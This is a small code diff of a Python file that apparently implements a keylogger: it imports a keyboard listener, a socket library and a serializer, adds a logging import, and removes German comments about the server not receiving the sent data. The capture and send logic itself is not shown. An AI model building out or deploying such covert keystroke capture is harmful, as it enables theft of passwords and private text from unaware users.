@@ -1,6 +1,7 @@
 from pynput.keyboard import Listener
 import socket
 from pickle import dumps
+from logging import basicConfig
 
 
 class Global:
@@ -88,5 +89,3 @@ while True:
 
 
 
-#Enpfängt data nicht richtig
-#Wenn Array nicht abgeschickt wird bekommt server daten trozdem nicht
